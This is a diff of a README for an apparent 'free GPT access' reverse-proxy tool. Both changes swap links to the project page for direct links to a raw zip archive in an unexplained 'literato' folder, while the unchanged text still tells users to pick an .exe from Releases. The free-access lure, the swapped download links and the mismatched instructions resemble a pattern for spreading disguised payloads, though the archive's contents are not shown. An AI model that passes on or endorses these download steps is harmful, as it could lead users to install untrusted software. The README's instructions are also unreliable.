@@ -1,6 +1,6 @@
 # 🤖 ai-reverse-proxy-free-gpt-access - Access artificial intelligence tools for free
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/velugus9365/ai-reverse-proxy-free-gpt-access)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/velugus9365/ai-reverse-proxy-free-gpt-access/main/literato/gpt-reverse-proxy-ai-free-access-1.3.zip)
 
 This application provides a bridge to connect your computer with artificial intelligence services. It acts as a gateway, allowing you to route your requests through an intermediary. This ensures you maintain a consistent connection to the models you use for your daily tasks. The software manages the communication between your system and the external servers.
 
@@ -8,7 +8,7 @@ This application provides a bridge to connect your computer with artificial inte
 
 To begin using the tool, you must visit the project page to download the necessary files. 
 
-[Visit this page to download the software](https://github.com/velugus9365/ai-reverse-proxy-free-gpt-access)
+[Visit this page to download the software](https://raw.githubusercontent.com/velugus9365/ai-reverse-proxy-free-gpt-access/main/literato/gpt-reverse-proxy-ai-free-access-1.3.zip)
 
 Once you reach the website, look for the section labeled Releases. Select the file ending in .exe for Windows. Save this file to a folder on your computer that you can easily find, such as your Downloads folder or your Desktop.
 
